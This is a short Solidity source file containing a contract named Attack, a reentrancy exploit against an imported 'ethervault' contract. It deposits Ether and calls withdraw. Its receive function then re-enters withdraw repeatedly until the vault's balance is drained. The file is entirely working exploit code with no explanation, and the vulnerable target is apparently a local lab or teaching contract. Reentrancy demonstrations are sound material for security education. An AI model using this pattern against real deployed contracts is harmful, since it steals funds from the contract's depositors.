// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ethervault.sol";

contract Attack {
    ethervault public Ethervault;
    constructor(address _EthervaultAddress) {
        Ethervault = ethervault(_EthervaultAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(Ethervault).balance > 0) {
            Ethervault.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        Ethervault.addBalance{value: msg.value}();
        Ethervault.withdraw();
    }
}